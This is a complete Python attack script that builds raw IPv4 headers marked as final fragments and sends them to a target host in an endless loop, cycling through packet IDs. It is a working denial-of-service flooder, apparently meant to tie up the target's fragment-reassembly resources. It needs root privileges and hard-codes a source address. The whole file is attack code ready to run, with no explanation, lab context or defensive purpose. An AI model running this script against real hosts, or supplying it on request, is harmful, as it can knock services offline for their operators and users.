#!/usr/bin/env python3

import argparse
import socket
import struct
import sys


def mk_parser():
    parser = argparse.ArgumentParser(
        description="Floods the target host with the start of IPv4 fragments"
    )
    parser.add_argument("host", help="The host to send packets to")
    return parser


def mk_sock():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        return sock
    except socket.error as e:
        if e.errno == 1:
            print("Script requires sudo privileges...")
        else:
            print(f"Could not create socket: {e}")
        sys.exit(1)


def mk_header_factory(src_ip, dst_ip):
    # Header Length = 5 bytes (no extra options)
    ihl = 5
    # IPv4
    ver = 4
    # Type of service / ECN (Don't mess with it)
    tos = 0
    # Handled by OS
    tot_len = 0
    # Flags | Offset
    # > Displays this as the very last fragment.
    # NOTE: Leaves one byte for data, or can be left empty.
    frag_off = 0b0001111111111110
    ttl = 255
    proto = socket.IPPROTO_TCP
    # Handled by OS
    check = 0
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)

    # Make this a byte
    ihl_ver = (ver << 4) | ihl

    def factory(packet_id: int):
        # Accepts a variable packet ID
        return struct.pack(
            "!BBHHHBBH4s4s",
            ihl_ver,
            tos,
            tot_len,
            packet_id,
            frag_off,
            ttl,
            proto,
            check,
            src,
            dst,
        )

    return factory


MAX_PACKET_ID = 65536


def main():
    args = mk_parser().parse_args()
    target = args.host
    src = "10.0.0.211"
    header_factory = mk_header_factory(src, target)
    sock = mk_sock()
    counter = 0
    try:
        while True:
            header = bytearray(header_factory(counter % MAX_PACKET_ID))
            # Add a byte, can be any num in [0, 255]
            header.append(10)
            sock.sendto(header, (target, 0))
            counter += 1
    except KeyboardInterrupt:
        print(f"\nSent {counter:,} packets to {target}!")
        sys.exit(0)


if __name__ == "__main__":
    main()
